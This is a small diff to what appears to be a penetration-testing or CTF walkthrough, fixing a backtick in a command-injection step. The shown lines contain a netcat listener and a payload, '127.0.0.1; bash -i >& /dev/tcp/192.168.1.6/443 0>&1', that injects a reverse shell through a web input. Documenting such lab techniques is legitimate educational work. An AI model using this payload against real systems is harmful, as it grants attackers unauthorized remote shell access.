@@ -123,7 +123,7 @@ root@kali:~#  nc -nlvp 443
 listening on [any] 443 ...
 
 ```
-Now get back to the browser and run this command : `127.0.0.1; bash -i >& /dev/tcp/192.168.1.6/443 0>&1```
+Now get back to the browser and run this command : `127.0.0.1; bash -i >& /dev/tcp/192.168.1.6/443 0>&1`
 Where `192.168.1.6` is the IP of the local machine.
 ```console
 root@kali:~#  nc -nlvp 443
